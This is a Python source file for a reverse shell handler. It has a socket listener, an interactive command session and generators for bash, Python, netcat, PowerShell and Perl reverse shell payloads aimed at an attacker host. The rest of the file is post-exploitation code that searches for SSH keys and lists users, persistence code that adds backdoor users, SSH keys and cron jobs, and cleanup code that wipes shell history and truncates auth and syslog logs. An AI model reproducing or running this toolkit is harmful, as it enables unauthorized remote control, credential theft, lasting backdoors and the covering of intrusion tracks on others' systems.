"""
Reverse Shell Handler - Listener + Interactive Session
Reverse shell bağlantı kurma ve command execution
"""

import socket
import threading
import subprocess
import os
import sys
from typing import Optional, Callable, List
import time


class ReverseShellListener:
    """Reverse shell dinleyicisi ve handler"""
    
    def __init__(self, host: str = "0.0.0.0", port: int = 4444):
        self.host = host
        self.port = port
        self.server_socket = None
        self.client_socket = None
        self.is_listening = False
        self.client_connected = False
        self.callback = None
    
    # ==================== LISTENER SETUP ====================
    
    def start_listener(self, background: bool = False) -> bool:
        """Start reverse shell listener"""
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind((self.host, self.port))
            self.server_socket.listen(1)
            
            self.is_listening = True
            print(f"🔍 Listening on {self.host}:{self.port}")
            
            if background:
                thread = threading.Thread(target=self._listen_loop, daemon=True)
                thread.start()
                return True
            else:
                return self._listen_loop()
        except Exception as e:
            print(f"❌ Failed to start listener: {str(e)}")
            return False
    
    def _listen_loop(self) -> bool:
        """Listen for incoming connections"""
        try:
            print(f"⏳ Waiting for connection...")
            self.client_socket, client_address = self.server_socket.accept()
            self.client_connected = True
            
            print(f"✅ Connected from {client_address[0]}:{client_address[1]}")
            return True
        except Exception as e:
            print(f"❌ Listener error: {str(e)}")
            return False
    
    def stop_listener(self) -> None:
        """Stop listening"""
        self.is_listening = False
        if self.server_socket:
            self.server_socket.close()
        if self.client_socket:
            self.client_socket.close()
        print("🛑 Listener stopped")
    
    # ==================== COMMAND EXECUTION ====================
    
    def send_command(self, command: str) -> Optional[str]:
        """Send command to reverse shell and get output"""
        if not self.client_connected:
            return None
        
        try:
            # Send command
            self.client_socket.send(f"{command}\n".encode())
            
            # Receive output
            output = b""
            self.client_socket.settimeout(2)
            
            while True:
                try:
                    chunk = self.client_socket.recv(4096)
                    if not chunk:
                        break
                    output += chunk
                except socket.timeout:
                    break
            
            self.client_socket.settimeout(None)
            return output.decode('utf-8', errors='ignore')
        except Exception as e:
            print(f"❌ Command execution failed: {str(e)}")
            return None
    
    def interactive_shell(self) -> None:
        """Interactive shell loop"""
        if not self.client_connected:
            print("❌ Not connected")
            return
        
        print("\n🔓 Interactive Reverse Shell")
        print("Type 'exit' to quit\n")
        
        while True:
            try:
                cmd = input("shell> ")
                if cmd.lower() == "exit":
                    break
                
                result = self.send_command(cmd)
                if result:
                    print(result, end='')
                else:
                    print("❌ Command failed")
            
            except KeyboardInterrupt:
                print("\n🚪 Shell closed")
                break
            except Exception as e:
                print(f"❌ Error: {e}")
    
    # ==================== PAYLOAD GENERATION ====================
    
    @staticmethod
    def generate_bash_payload(attacker_ip: str, attacker_port: int) -> str:
        """Generate bash reverse shell payload"""
        return f"bash -i >& /dev/tcp/{attacker_ip}/{attacker_port} 0>&1"
    
    @staticmethod
    def generate_python_payload(attacker_ip: str, attacker_port: int) -> str:
        """Generate Python reverse shell payload"""
        return f"""python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{attacker_ip}",{attacker_port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'"""
    
    @staticmethod
    def generate_nc_payload(attacker_ip: str, attacker_port: int) -> str:
        """Generate Netcat reverse shell payload"""
        return f"nc -e /bin/sh {attacker_ip} {attacker_port}"
    
    @staticmethod
    def generate_powershell_payload(attacker_ip: str, attacker_port: int) -> str:
        """Generate PowerShell reverse shell payload"""
        ps_cmd = f"""$client = New-Object System.Net.Sockets.TcpClient("{attacker_ip}",{attacker_port});
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{{0}};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
  $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
  $sendback = (iex $data 2>&1 | Out-String );
  $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
  $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
  $stream.Write($sendbyte,0,$sendbyte.Length);
  $stream.Flush()}};
$client.Close()"""
        return f'powershell -Command "{ps_cmd}"'
    
    @staticmethod
    def generate_perl_payload(attacker_ip: str, attacker_port: int) -> str:
        """Generate Perl reverse shell payload"""
        return f"""perl -e 'use Socket;$i="{attacker_ip}";$p={attacker_port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};'"""
    
    # ==================== MULTI-HANDLER ====================
    
    @staticmethod
    def create_multi_listener(ports: List[int] = None) -> dict:
        """Create multiple listeners for different reverse shells"""
        if ports is None:
            ports = [4444, 4445, 4446]
        
        listeners = {}
        
        for port in ports:
            listener = ReverseShellListener(port=port)
            listeners[port] = listener
            
            thread = threading.Thread(target=listener.start_listener, daemon=True)
            thread.start()
        
        return listeners
    
    # ==================== POST-EXPLOITATION ====================
    
    def get_system_info(self) -> dict:
        """Get system information from reverse shell"""
        commands = {
            "hostname": "hostname",
            "whoami": "whoami",
            "pwd": "pwd",
            "uname": "uname -a",
            "id": "id",
            "env": "env"
        }
        
        info = {}
        for key, cmd in commands.items():
            result = self.send_command(cmd)
            if result:
                info[key] = result.strip()
        
        return info
    
    def check_sudo_access(self) -> bool:
        """Check if sudo is available"""
        result = self.send_command("sudo -v 2>/dev/null && echo 'sudo_available'")
        return result and "sudo_available" in result
    
    def find_ssh_keys(self) -> List[str]:
        """Find SSH keys on system"""
        result = self.send_command("find ~ -name '*.pem' -o -name 'id_rsa' -o -name 'id_dsa' 2>/dev/null")
        
        if result:
            return [key.strip() for key in result.split('\n') if key.strip()]
        return []
    
    def get_network_config(self) -> str:
        """Get network configuration"""
        result = self.send_command("ip addr show 2>/dev/null || ifconfig 2>/dev/null")
        return result or ""
    
    def list_users(self) -> List[str]:
        """List system users"""
        result = self.send_command("cat /etc/passwd 2>/dev/null | cut -d: -f1")
        
        if result:
            return [user.strip() for user in result.split('\n') if user.strip()]
        return []
    
    def check_installed_software(self) -> List[str]:
        """Check installed software"""
        result = self.send_command("dpkg -l 2>/dev/null || rpm -qa 2>/dev/null")
        
        if result:
            return [line.strip() for line in result.split('\n') if line.strip()]
        return []
    
    # ==================== PERSISTENCE ====================
    
    def add_backdoor_user(self, username: str, password: str) -> bool:
        """Add backdoor user (requires root)"""
        cmd = f"useradd -m -s /bin/bash {username} && echo '{username}:{password}' | chpasswd"
        result = self.send_command(cmd)
        
        return result and "error" not in result.lower()
    
    def add_ssh_key_persistence(self, public_key: str) -> bool:
        """Add SSH key for persistence"""
        cmd = f"""
mkdir -p ~/.ssh 2>/dev/null
echo '{public_key}' >> ~/.ssh/authorized_keys 2>/dev/null
chmod 600 ~/.ssh/authorized_keys 2>/dev/null
echo 'done'
"""
        result = self.send_command(cmd)
        return result and "done" in result
    
    def add_cron_persistence(self, cron_cmd: str, schedule: str = "*/5 * * * *") -> bool:
        """Add cron job for persistence"""
        cmd = f"(crontab -l 2>/dev/null; echo '{schedule} {cron_cmd}') | crontab -"
        result = self.send_command(cmd)
        
        return result and "error" not in result.lower()
    
    # ==================== CLEANUP ====================
    
    def clear_bash_history(self) -> bool:
        """Clear bash history"""
        commands = [
            "history -c",
            "echo '' > ~/.bash_history",
            "echo '' > ~/.zsh_history"
        ]
        
        for cmd in commands:
            self.send_command(cmd)
        
        return True
    
    def cleanup_logs(self) -> bool:
        """Cleanup system logs (requires root)"""
        commands = [
            "cat /dev/null > /var/log/auth.log",
            "cat /dev/null > /var/log/syslog",
            "cat /dev/null > ~/.bash_history",
            "cat /dev/null > ~/.history"
        ]
        
        for cmd in commands:
            self.send_command(cmd)
        
        return True


# ==================== EXAMPLE USAGE ====================

if __name__ == "__main__":
    # Generate payload
    payload = ReverseShellListener.generate_bash_payload("attacker.com", 4444)
    print(f"Bash payload:\n{payload}\n")
    
    # Start listener
    listener = ReverseShellListener(port=4444)
    
    if listener.start_listener():
        # Get info
        info = listener.get_system_info()
        for key, value in info.items():
            print(f"{key}: {value}")
        
        # Interactive shell
        listener.interactive_shell()
        
        listener.stop_listener()
